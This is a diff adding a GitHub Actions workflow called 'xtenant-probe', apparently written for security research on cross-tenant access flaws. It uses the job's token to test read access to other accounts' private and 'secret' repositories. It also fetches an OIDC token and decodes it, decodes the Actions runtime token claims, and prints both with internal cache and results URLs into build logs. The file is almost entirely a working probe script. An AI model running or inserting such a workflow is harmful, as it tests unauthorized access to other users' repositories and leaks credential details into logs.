@@ -1,0 +1,31 @@
+name: xtenant-probe
+on: push
+permissions:
+  id-token: write
+  contents: read
+jobs:
+  probe:
+    runs-on: ubuntu-latest
+    steps:
+      - name: gh-token cross-repo scope matrix
+        env:
+          GT: ${{ github.token }}
+        run: |
+          echo "## GITHUB_TOKEN cross-repo read matrix"
+          for r in toofikz4/dep-idor-probe tooforg/idor-secret-repo tooforg/private-test-repo tooforg/public-test-repo; do
+            c=$(curl -s -o /dev/null -w "%{http_code}" -H "Authorization: Bearer $GT" https://api.github.com/repos/$r)
+            echo "  $r -> $c"
+          done
+          echo "## token /user (should be the gh-actions app, not a user)"
+          curl -s -H "Authorization: Bearer $GT" https://api.github.com/installation/repositories 2>/dev/null | head -c 120; echo
+      - name: oidc + runtime claims
+        env:
+          IDTOK_URL: ${{ env.ACTIONS_ID_TOKEN_REQUEST_URL }}
+          IDTOK_RT: ${{ env.ACTIONS_ID_TOKEN_REQUEST_TOKEN }}
+        run: |
+          echo "## OIDC claims"
+          V=$(curl -s -H "Authorization: Bearer $IDTOK_RT" "$IDTOK_URL&audience=xtenant" | python3 -c "import sys,json;print(json.load(sys.stdin).get('value',''))" 2>/dev/null)
+          echo "$V" | cut -d. -f2 | tr '_-' '/+' | base64 -d 2>/dev/null | python3 -m json.tool 2>/dev/null | head -40
+          echo "## ACTIONS backend URLs + runtime token CLAIMS (scope analysis)"
+          echo "  RESULTS_URL=${ACTIONS_RESULTS_URL:-unset}"; echo "  CACHE_URL=${ACTIONS_CACHE_URL:-unset}"
+          echo "$ACTIONS_RUNTIME_TOKEN" | cut -d. -f2 | tr '_-' '/+' | base64 -d 2>/dev/null | python3 -m json.tool 2>/dev/null | head -50
